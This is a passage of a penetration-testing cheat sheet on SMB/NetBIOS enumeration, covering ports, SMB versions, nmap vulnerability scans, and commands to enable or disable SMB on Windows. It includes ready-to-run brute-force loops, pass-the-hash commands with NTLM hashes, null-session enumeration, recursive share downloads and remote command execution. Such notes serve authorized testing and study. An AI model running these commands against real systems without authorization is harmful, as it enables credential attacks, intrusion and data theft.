<li>On <code class="codehilite"><span class="n">UDP</span> <span class="n">ports</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">138</span></code> &amp; <code class="codehilite"><span class="n">TCP</span> <span class="n">ports</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">139</span></code> (<code class="codehilite"><span class="n">NetBIOS</span> <span class="n">over</span> <span class="n">TCP</span><span class="o">/</span><span class="n">IP</span></code>);</li>
<li>On several legacy protocols such as <code class="codehilite"><span class="n">NBF</span></code>, <code class="codehilite"><span class="n">IPX</span><span class="o">/</span><span class="n">SPX</span></code>.</li>
</ul>
</li>
<li>The SMB <code class="codehilite"><span class="ss">&quot;Inter-Process Communication&quot;</span> <span class="p">(</span><span class="n">IPC</span><span class="p">)</span></code> system provides <code class="codehilite"><span class="n">named</span> <span class="n">pipes</span></code> and was one of the first inter-process mechanisms commonly available to programmers that provides a means for services to <code class="codehilite"><span class="n">inherit</span> <span class="n">the</span> <span class="n">authentication</span></code> carried out when a client first connects to an SMB server.</li>
<li>Ports<ul>
<li>netbios-ns <code class="codehilite"><span class="mi">137</span><span class="o">/</span><span class="n">tcp</span></code> # (NBT over IP) NETBIOS Name Service</li>
<li>netbios-ns <code class="codehilite"><span class="mi">137</span><span class="o">/</span><span class="n">udp</span></code></li>
<li>.</li>
<li>netbios-dgm <code class="codehilite"><span class="mi">138</span><span class="o">/</span><span class="n">tcp</span></code> # (NBT over IP) NETBIOS Datagram Service</li>
<li>netbios-dgm <code class="codehilite"><span class="mi">138</span><span class="o">/</span><span class="n">udp</span></code></li>
<li>.</li>
<li>netbios-ssn <code class="codehilite"><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span></code> # (NBT over IP) NETBIOS session service</li>
<li>netbios-ssn <code class="codehilite"><span class="mi">139</span><span class="o">/</span><span class="n">udp</span></code></li>
<li>.</li>
<li>microsoft-ds <code class="codehilite"><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span></code> # (SMB over IP) If you are using Active Directory (used when SMB is used directly on TCP stack, without using NetBIOS)</li>
</ul>
</li>
</ul>
<h4 id="version">Version<a class="headerlink" href="#version" title="Permanent link">&para;</a></h4>
<ul>
<li>Version enumeration
    <div class="codehilite"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_version</span>
</pre></div></li>
<li>Server Message Block (SMB) Versions</li>
</ul>
<table>
<thead>
<tr>
<th align="left">SMB Version</th>
<th align="left">Windows version</th>
</tr>
</thead>
<tbody>
<tr>
<td align="left">CIFS</td>
<td align="left">Microsoft Windows NT 4.0</td>
</tr>
<tr>
<td align="left">SMB 1.0</td>
<td align="left">Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2</td>
</tr>
<tr>
<td align="left">SMB 2.0</td>
<td align="left">Windows Vista &amp; Windows Server 2008</td>
</tr>
<tr>
<td align="left">SMB 2.1</td>
<td align="left">Windows 7 and Windows Server 2008 R2</td>
</tr>
<tr>
<td align="left">SMB 3.0</td>
<td align="left">Windows 8 and Windows Server 2012</td>
</tr>
<tr>
<td align="left">SMB 3.0.2</td>
<td align="left">Windows 8.1 and Windows Server 2012 R2</td>
</tr>
<tr>
<td align="left">SMB 3.1.1</td>
<td align="left">Windows 10 and Windows Server 2016</td>
</tr>
</tbody>
</table>
<p><em>Samba Version Enumeration</em></p>
<div class="codehilite"><pre><span></span><span class="ch">#!/bin/sh</span>

<span class="c1"># Author: rewardone</span>
<span class="c1"># Description:</span>
<span class="c1">#  Requires root or enough permissions to use tcpdump</span>
<span class="c1">#  Will listen for the first 7 packets of a null login</span>
<span class="c1">#  and grab the SMB Version</span>
<span class="c1"># Notes:</span>
<span class="c1">#  Will sometimes not capture or will print multiple</span>
<span class="c1">#  lines. May need to run a second time for success.</span>

<span class="k">if</span> <span class="o">[</span> -z <span class="nv">$1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> <span class="s2">&quot;Usage: ./smbver.sh RHOST {RPORT}&quot;</span> <span class="o">&amp;&amp;</span> exit<span class="p">;</span> <span class="k">else</span> <span class="nv">rhost</span><span class="o">=</span><span class="nv">$1</span><span class="p">;</span> <span class="k">fi</span>
<span class="k">if</span> <span class="o">[</span> ! -z <span class="nv">$2</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="nv">rport</span><span class="o">=</span><span class="nv">$2</span><span class="p">;</span> <span class="k">else</span> <span class="nv">rport</span><span class="o">=</span><span class="m">139</span><span class="p">;</span> <span class="k">fi</span>

tcpdump -s0 -n -i tap0 src <span class="nv">$rhost</span> and port <span class="nv">$rport</span> -A -c <span class="m">7</span> <span class="m">2</span>&gt;/dev/null <span class="p">|</span> grep -i <span class="s2">&quot;samba\|s.a.m&quot;</span> <span class="p">|</span> tr -d <span class="s1">&#39;.&#39;</span> <span class="p">|</span> grep -oP <span class="s1">&#39;UnixSamba.*[0-9a-z]&#39;</span> <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span> <span class="p">&amp;</span> <span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$rhost</span><span class="s2">: &quot;</span> <span class="p">&amp;</span>

<span class="nb">echo</span> <span class="s2">&quot;exit&quot;</span> <span class="p">|</span> smbclient -L <span class="nv">$rhost</span> <span class="m">1</span>&gt;/dev/null <span class="m">2</span>&gt;/dev/null
<span class="nb">echo</span> <span class="s2">&quot;&quot;</span> <span class="o">&amp;&amp;</span> sleep .1
</pre></div>

<h4 id="scanning">Scanning<a class="headerlink" href="#scanning" title="Permanent link">&para;</a></h4>
<ul>
<li>References: <ul>
<li><a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration">https://www.hackingarticles.in/a-little-guide-to-smb-enumeration</a> </li>
<li><a href="https://security.stackexchange.com/questions/119827/missing-scripts-in-nmap">https://security.stackexchange.com/questions/119827/missing-scripts-in-nmap</a></li>
</ul>
</li>
<li>nmap
  <div class="codehilite"><pre><span></span>ls -lh /usr/share/nmap/scripts/smb*
</pre></div>
  <div class="codehilite"><pre><span></span>nmap --script safe -p445 <span class="nv">$ip</span>
</pre></div>
  <div class="codehilite"><pre><span></span>nmap --script smb-protocols -p445 <span class="nv">$ip</span>
</pre></div>
  <div class="codehilite"><pre><span></span>nmap -p <span class="m">139</span>,446 <span class="nv">$ip</span> --open
</pre></div>
  <div class="codehilite"><pre><span></span>nmap ‐v ‐p <span class="m">139</span>,445 -‐script smb‐*  <span class="nv">$ip</span>
nmap ‐v ‐p <span class="m">139</span>,445 --script vuln <span class="nv">$ip</span>
nmap ‐v ‐p <span class="m">139</span>,445 -‐script smb‐vuln*  <span class="nv">$ip</span>
nmap ‐v ‐p <span class="m">139</span>,445 -‐script smb‐security‐mode  <span class="nv">$ip</span>
nmap ‐v ‐p <span class="m">139</span>,445 -‐script smb‐os-discovery  <span class="nv">$ip</span>
nmap ‐v ‐p <span class="m">139</span>,445 -‐script smb‐check-vulns --script-args<span class="o">=</span><span class="nv">unsafe</span><span class="o">=</span><span class="m">1</span>  <span class="nv">$ip</span>
</pre></div>
  <div class="codehilite"><pre><span></span>smb-vuln-conficker
smb-vuln-cve2009-3103
smb-vuln-ms06-025
smb-vuln-ms07-029
smb-vuln-regsvc-dos
smb-vuln-ms08-067
</pre></div>
  <div class="codehilite"><pre><span></span>nmap --script smb-brute.nse -p445 <span class="o">(</span>TARGET IP ADDRESS<span class="o">)</span>
nmap -p <span class="m">139</span>.445 --script smb-enum-users <span class="o">(</span>TARGET IP ADDRESS<span class="o">)</span>
</pre></div></li>
</ul>
<h4 id="enable-disable-status">Enable / Disable / Status<a class="headerlink" href="#enable-disable-status" title="Permanent link">&para;</a></h4>
<ul>
<li>Detect, enable and disableyeha SMBv1, SMBv2, and SMBv3 in Windows and Windows Server: <a href="https://support.microsoft.com/en-gb/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and">https://support.microsoft.com/en-gb/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and</a></li>
<li>Windows Server 2012 R2 &amp; 2016: PowerShell methods<ul>
<li>SMB v1<ul>
<li>Detect: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">WindowsFeature</span> <span class="n">FS</span><span class="o">-</span><span class="n">SMB1</span></code></li>
<li>Disable: <code class="codehilite"><span class="n">Disable</span><span class="o">-</span><span class="n">WindowsOptionalFeature</span> <span class="o">-</span><span class="n">Online</span> <span class="o">-</span><span class="n">FeatureName</span> <span class="n">smb1protocol</span></code></li>
<li>Enable: <code class="codehilite"><span class="n">Enable</span><span class="o">-</span><span class="n">WindowsOptionalFeature</span> <span class="o">-</span><span class="n">Online</span> <span class="o">-</span><span class="n">FeatureName</span> <span class="n">smb1protocol</span></code></li>
</ul>
</li>
<li>SMB v2/v3<ul>
<li>Detect: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">|</span> <span class="k">Select</span> <span class="n">EnableSMB2Protocol</span></code></li>
<li>Disable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">false</span></code></li>
<li>Enable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">true</span></code></li>
</ul>
</li>
</ul>
</li>
<li>Windows 8.1 and Windows 10: PowerShell method<ul>
<li>SMB v1 Protocol<ul>
<li>Detect:   <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">WindowsOptionalFeature</span> <span class="err">–</span><span class="n">Online</span> <span class="err">–</span><span class="n">FeatureName</span> <span class="n">SMB1Protocol</span></code></li>
<li>Disable:  <code class="codehilite"><span class="n">Disable</span><span class="o">-</span><span class="n">WindowsOptionalFeature</span> <span class="o">-</span><span class="n">Online</span> <span class="o">-</span><span class="n">FeatureName</span> <span class="n">SMB1Protocol</span></code></li>
<li>Enable:   <code class="codehilite"><span class="n">Enable</span><span class="o">-</span><span class="n">WindowsOptionalFeature</span> <span class="o">-</span><span class="n">Online</span> <span class="o">-</span><span class="n">FeatureName</span> <span class="n">SMB1Protocol</span></code></li>
</ul>
</li>
<li>SMB v2/v3 Protocol<ul>
<li>Detect:   <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">|</span> <span class="k">Select</span> <span class="n">EnableSMB2Protocol</span></code></li>
<li>Disable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="err">–</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">false</span></code></li>
<li>Enable:   <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="err">–</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">true</span></code></li>
</ul>
</li>
</ul>
</li>
<li>Windows 8 and Windows Server 2012<ul>
<li>SMB v1 on SMB Server<ul>
<li>Detect:   <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">|</span> <span class="k">Select</span> <span class="n">EnableSMB1Protocol</span></code></li>
<li>Disable:  <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB1Protocol</span> <span class="err">$</span><span class="k">false</span></code></li>
<li>Enable:   <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB1Protocol</span> <span class="err">$</span><span class="k">true</span></code></li>
</ul>
</li>
<li>SMB v2/v3 on SMB Server<ul>
<li>Detect:   <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">|</span> <span class="k">Select</span> <span class="n">EnableSMB2Protocol</span></code></li>
<li>Disable:  <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">false</span></code></li>
<li>Enable:   <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">true</span></code></li>
</ul>
</li>
</ul>
</li>
<li>Windows 7, Windows Server 2008 R2, Windows Vista, and Windows Server 2008<ul>
<li>SMB v1 on SMB Server<ul>
<li>Default configuration = Enabled (No registry key is created), so no SMB1 value will be returned</li>
<li>Detect: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Item</span> <span class="n">HKLM</span><span class="p">:</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Services</span><span class="err">\</span><span class="n">LanmanServer</span><span class="err">\</span><span class="k">Parameters</span> <span class="o">|</span> <span class="n">ForEach</span><span class="o">-</span><span class="k">Object</span> <span class="err">{</span><span class="k">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">pspath</span><span class="err">}</span></code></li>
<li>Disable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span> <span class="n">SMB1</span> <span class="o">-</span><span class="k">Type</span> <span class="n">DWORD</span> <span class="o">-</span><span class="n">Value</span> <span class="mi">0</span> <span class="err">–</span><span class="k">Force</span></code></li>
<li>Enable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span> <span class="n">SMB1</span> <span class="o">-</span><span class="k">Type</span> <span class="n">DWORD</span> <span class="o">-</span><span class="n">Value</span> <span class="mi">1</span> <span class="err">–</span><span class="k">Force</span></code></li>
</ul>
</li>
<li>SMB v2/v3 on SMB Server<ul>
<li>Detect: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="n">HKLM</span><span class="p">:</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Services</span><span class="err">\</span><span class="n">LanmanServer</span><span class="err">\</span><span class="k">Parameters</span> <span class="o">|</span> <span class="n">ForEach</span><span class="o">-</span><span class="k">Object</span> <span class="err">{</span><span class="k">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">pspath</span><span class="err">}</span></code></li>
<li>Disable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span> <span class="n">SMB2</span> <span class="o">-</span><span class="k">Type</span> <span class="n">DWORD</span> <span class="o">-</span><span class="n">Value</span> <span class="mi">0</span> <span class="err">–</span><span class="k">Force</span></code></li>
<li>Enable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span> <span class="n">SMB2</span> <span class="o">-</span><span class="k">Type</span> <span class="n">DWORD</span> <span class="o">-</span><span class="n">Value</span> <span class="mi">1</span> <span class="err">–</span><span class="k">Force</span></code></li>
</ul>
</li>
</ul>
</li>
<li>Disable SMB Client<ul>
<li>SMB v1 on SMB Client<ul>
<li>Detect:   <code class="codehilite"><span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">qc</span> <span class="n">lanmanworkstation</span></code></li>
<li>Disable:
    <div class="codehilite"><pre><span></span>sc.exe config lanmanworkstation <span class="nv">depend</span><span class="o">=</span> bowser/mrxsmb20/nsi
sc.exe config mrxsmb10 <span class="nv">start</span><span class="o">=</span> disabled
</pre></div></li>
<li>Enable:
    <div class="codehilite"><pre><span></span>sc.exe config lanmanworkstation <span class="nv">depend</span><span class="o">=</span> bowser/mrxsmb10/mrxsmb20/nsi
sc.exe config mrxsmb10 <span class="nv">start</span><span class="o">=</span> auto
</pre></div></li>
</ul>
</li>
<li>SMB v2/v3 on SMB Client<ul>
<li>Detect:   <code class="codehilite"><span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">qc</span> <span class="n">lanmanworkstation</span></code></li>
<li>Disable:
    <div class="codehilite"><pre><span></span>sc.exe config lanmanworkstation <span class="nv">depend</span><span class="o">=</span> bowser/mrxsmb10/nsi
sc.exe config mrxsmb20 <span class="nv">start</span><span class="o">=</span> disabled
</pre></div></li>
<li>Enable:
    <div class="codehilite"><pre><span></span>sc.exe config lanmanworkstation <span class="nv">depend</span><span class="o">=</span> bowser/mrxsmb10/mrxsmb20/nsi
sc.exe config mrxsmb20 <span class="nv">start</span><span class="o">=</span> auto
</pre></div></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="other">Other<a class="headerlink" href="#other" title="Permanent link">&para;</a></h4>
<ul>
<li>NetBIOS suffixes<ul>
<li>For unique names:
  <div class="codehilite"><pre><span></span><span class="mi">00</span>: <span class="nv">Workstation</span> <span class="nv">Service</span> <span class="ss">(</span><span class="nv">workstation</span> <span class="nv">name</span><span class="ss">)</span>
<span class="mi">03</span>: <span class="nv">Windows</span> <span class="nv">Messenger</span> <span class="nv">service</span>
<span class="mi">06</span>: <span class="nv">Remote</span> <span class="nv">Access</span> <span class="nv">Service</span>
<span class="mi">20</span>: <span class="nv">File</span> <span class="nv">Service</span> <span class="ss">(</span><span class="nv">also</span> <span class="nv">called</span> <span class="nv">Host</span> <span class="nv">Record</span><span class="ss">)</span>
<span class="mi">21</span>: <span class="nv">Remote</span> <span class="nv">Access</span> <span class="nv">Service</span> <span class="nv">client</span>
<span class="mi">1</span><span class="nv">B</span>: <span class="nv">Domain</span> <span class="nv">Master</span> <span class="nv">Browser</span> – <span class="nv">Primary</span> <span class="nv">Domain</span> <span class="nv">Controller</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">domain</span>
<span class="mi">1</span><span class="nv">D</span>: <span class="nv">Master</span> <span class="nv">Browser</span>
</pre></div></li>
<li>For group names:
  <div class="codehilite"><pre><span></span><span class="mi">00</span>: <span class="nv">Workstation</span> <span class="nv">Service</span> <span class="ss">(</span><span class="nv">workgroup</span><span class="o">/</span><span class="nv">domain</span> <span class="nv">name</span><span class="ss">)</span>
<span class="mi">1</span><span class="nv">C</span>: <span class="nv">Domain</span> <span class="nv">Controllers</span> <span class="k">for</span> <span class="nv">a</span> <span class="nv">domain</span>
<span class="mi">1</span><span class="nv">E</span>: <span class="nv">Browser</span> <span class="nv">Service</span> <span class="nv">Elections</span>
</pre></div></li>
</ul>
</li>
<li>User enumerate: <code class="codehilite"><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_lookupsid</span></code></li>
<li>Bruteforcing:
    <div class="codehilite"><pre><span></span>auxiliary/scanner/smb/smb_login
</pre></div>
    <div class="codehilite"><pre><span></span><span class="k">while</span> <span class="nb">read</span> USER<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$USER</span> <span class="o">&amp;&amp;</span> smbmap -H <span class="m">10</span>.10.10.172 -u <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> -p <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">done</span> &lt; userslist
</pre></div>
    <div class="codehilite"><pre><span></span>patator smb_login <span class="nv">host</span><span class="o">=</span><span class="m">10</span>.121.1.33 <span class="nv">domain</span><span class="o">=</span>CONTOSO <span class="nv">user</span><span class="o">=</span>COMBO00 <span class="nv">password</span><span class="o">=</span>COMBO01 <span class="nv">0</span><span class="o">=</span>/root/oscp/lab-net2019/combo-creds.txt -l smb_brute

patator smb_login <span class="nv">host</span><span class="o">=</span>FILE0 <span class="nv">domain</span><span class="o">=</span>CONTOSO.LOCAL <span class="nv">user</span><span class="o">=</span>COMBO10 <span class="nv">password</span><span class="o">=</span>COMBO11 <span class="nv">0</span><span class="o">=</span>/root/oscp/lab-net2019/smb-open.txt <span class="nv">1</span><span class="o">=</span>/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep<span class="o">=</span>”STATUS_LOGON_FAILURE”

–timeout <span class="m">100</span> –threads<span class="o">=</span><span class="m">2</span> –rate-limit<span class="o">=</span><span class="m">2</span> 
</pre></div></li>
<li>Mount SMB share
    <div class="codehilite"><pre><span></span>sudo apt-get install cifs-utils
</pre></div>
    <div class="codehilite"><pre><span></span>mkdir /mnt/<span class="nv">$shareName</span>
mount -t cifs //<span class="nv">$ip</span>/<span class="nv">$shareName</span> /mnt/<span class="nv">$shareName</span> -o <span class="nv">username</span><span class="o">=</span><span class="nv">$username</span>,password<span class="o">=</span><span class="nv">$password</span>,domain<span class="o">=</span><span class="nv">$domain</span>

mount -t auto --source //192.168.31.147/kathy --target /tmp/smb/ -o <span class="nv">username</span><span class="o">=</span>root,workgroup<span class="o">=</span>WORKGROUP
</pre></div>
    <div class="codehilite"><pre><span></span>mount -t cifs //10.10.10.134/backups /mnt/share -o <span class="nv">user</span><span class="o">=</span>,password<span class="o">=</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="n">X</span><span class="p">:</span> <span class="err">\\</span><span class="o">&lt;</span><span class="n">server</span><span class="o">&gt;</span><span class="err">\</span><span class="o">&lt;</span><span class="n">sharename</span><span class="o">&gt;</span> <span class="o">/</span><span class="k">USER</span><span class="p">:</span><span class="o">&lt;</span><span class="k">domain</span><span class="o">&gt;</span><span class="err">\</span><span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">PERSISTENT</span><span class="p">:</span><span class="n">YES</span>
</pre></div></li>
<li>Null Session Enumeration (enabled by default in SMB1)
    <div class="codehilite"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="err">\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="err">\</span><span class="n">ipc$</span> <span class="ss">&quot;&quot;</span> <span class="o">/</span><span class="n">u</span><span class="p">:</span><span class="ss">&quot;&quot;</span>
<span class="n">net</span> <span class="k">view</span> <span class="err">\\</span><span class="n">ip_address</span>
</pre></div>
    <div class="codehilite"><pre><span></span>rpcclient -U <span class="s2">&quot;&quot;</span> ip <span class="o">(</span>give empty password<span class="o">)</span>
&gt; srvinfo
&gt; enumdomusers
&gt; getdompwinfo
</pre></div></li>
<li>Use UpTime to guess patch level: <a href="https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py">https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py</a>
    <div class="codehilite"><pre><span></span>python FindSMB2UpTime.py <span class="m">172</span>.16.80.10
</pre></div></li>
<li>Samba<ul>
<li>Configuration Files
    <div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">samba</span><span class="o">/</span><span class="n">smb</span><span class="p">.</span><span class="n">conf</span>
<span class="n">smb</span><span class="p">.</span><span class="n">conf</span>
<span class="n">lmhosts</span>
</pre></div></li>
<li>Test &amp; reload configuration
    <div class="codehilite"><pre><span></span><span class="n">testparm</span> <span class="o">-</span><span class="n">v</span>
<span class="n">service</span> <span class="n">smb</span> <span class="k">restart</span>
</pre></div></li>
<li>User creation: <code class="codehilite"><span class="n">smbpasswd</span> <span class="o">-</span><span class="n">a</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span></code></li>
</ul>
</li>
</ul>
<h3 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h3>
<ul>
<li>nmblookup<ul>
<li>Query NetBIOS names and map them to IP addresses in a network</li>
<li>Using NetBIOS over TCP/IP queries
  <div class="codehilite"><pre><span></span><span class="n">nmblookup</span> <span class="o">-</span><span class="n">A</span> <span class="err">$</span><span class="n">ip</span>
</pre></div></li>
</ul>
</li>
<li>nbtscan<ul>
<li>Scan NetBIOS name servers open on a local or remote TCP/IP network</li>
<li>Works on a whole subnet instead of individual IP</li>
<li>Similar to <code class="codehilite"><span class="n">nbtstat</span></code> (Windows standard tool)
  <div class="codehilite"><pre><span></span><span class="n">nbtscan</span> <span class="err">$</span><span class="n">ip</span><span class="o">/</span><span class="mi">24</span>
</pre></div></li>
</ul>
</li>
<li>nbtstat
    <div class="codehilite"><pre><span></span><span class="n">nbtstat</span> <span class="err">$</span><span class="n">ip</span>
<span class="n">nbtscan</span> <span class="o">-</span><span class="err">‐</span><span class="n">r</span> <span class="err">$</span><span class="n">ip</span><span class="o">/</span><span class="mi">24</span>
</pre></div><ul>
<li>nbtstat -c: displays the contents of the NetBIOS name cache, the table of NetBIOS names and their resolved IP addresses.</li>
<li>nbtstat -n: displays the names that have been registered locally on the system.</li>
<li>nbtstat -r: displays the count of all NetBIOS names resolved by broadcast and querying a WINS server.</li>
<li>nbtstat -R: purges and reloads the remote cache name table.</li>
<li>nbtstat -RR: sends name release packets to WINs and then starts Refresh.</li>
<li>nbtstat -s: lists the current NetBIOS sessions and their status, including statistics.</li>
<li>nbtstat -S: lists sessions table with the destination IP addresses.</li>
</ul>
</li>
<li>SMBMap - enumerate samba share drives across an entire domain<ul>
<li>Allows users to enumerate samba share drives across an entire domain</li>
<li>Usage<ul>
<li>List share drives, drive permissions, share contents</li>
<li>Upload/download functionality</li>
<li>File name auto-download pattern matching</li>
<li>Execute remote commands
<div class="codehilite"><pre><span></span>smbmap -H <span class="nv">$ip</span>
</pre></div>
<div class="codehilite"><pre><span></span>smbmap -d &lt;workgroup&gt; -H <span class="nv">$ip</span>
smbmap -u <span class="s2">&quot;&quot;</span> -p <span class="s2">&quot;&quot;</span> -d &lt;workgroup&gt; -H <span class="nv">$ip</span>
smbmap -u guest -p <span class="s2">&quot;&quot;</span> -d &lt;workgroup&gt; -H <span class="nv">$ip</span>
smbmap -u &lt;user&gt; -p &lt;password&gt; -d &lt;workgroup&gt; -H <span class="nv">$ip</span>
smbmap -u &lt;user&gt; -p &lt;password&gt; -d &lt;workgroup&gt; -H <span class="nv">$ip</span> -L  <span class="c1">#test command execution</span>
smbmap -u &lt;user&gt; -p &lt;password&gt; -d &lt;workgroup&gt; -H <span class="nv">$ip</span> -r  <span class="c1">#read drive</span>

smbmap -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> -H <span class="m">192</span>.168.1.23 <span class="c1"># similar to crackmapexec --shares</span>
smbmap -u guest -p <span class="s1">&#39;&#39;</span> -H <span class="m">192</span>.168.1.23
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H <span class="m">192</span>.168.1.23
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H <span class="m">192</span>.168.1.23 -r <span class="c1"># list top level dir</span>
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H <span class="m">192</span>.168.1.23 -R <span class="c1"># list everything recursively</span>
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H <span class="m">192</span>.168.1.23 -s wwwroot -R -A <span class="s1">&#39;.*&#39;</span> <span class="c1"># download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work</span>
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H <span class="m">192</span>.168.1.23 -x whoami <span class="c1"># no work</span>
</pre></div></li>
</ul>
</li>
<li>Recursively list dirs, and files:
  <div class="codehilite"><pre><span></span>smbmap -R <span class="nv">$sharename</span> -H <span class="nv">$ip</span>
</pre></div></li>
<li>Search for <code class="codehilite"><span class="n">Groups</span><span class="p">.</span><span class="n">xml</span></code> in given share:
  <div class="codehilite"><pre><span></span>smbmap -R <span class="nv">$shareName</span> -H <span class="nv">$ip</span> -A Groups.xml -q
</pre></div></li>
<li>Downloads a file in quiet mode:
  <div class="codehilite"><pre><span></span>smbmap -R <span class="nv">$sharename</span> -H <span class="nv">$ip</span> -A <span class="nv">$fileyouwanttodownload</span> -q
</pre></div></li>
<li>Using hash:
  <div class="codehilite"><pre><span></span>mbmap.py -u user123 -p <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDFFFFFFFFFFF8B9FD8B&#39;</span> -H <span class="o">(</span>TARGET IP ADDRESS<span class="o">)</span>
</pre></div></li>
</ul>
</li>
<li>smbclient<ul>
<li><a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">https://www.samba.org/samba/docs/current/man-html/smbclient.1.html</a></li>
<li>Client that can "talk" to an SMB/CIFS server</li>
<li>Operations<ul>
<li>Upload/download functionality</li>
<li>Retrieving directory information
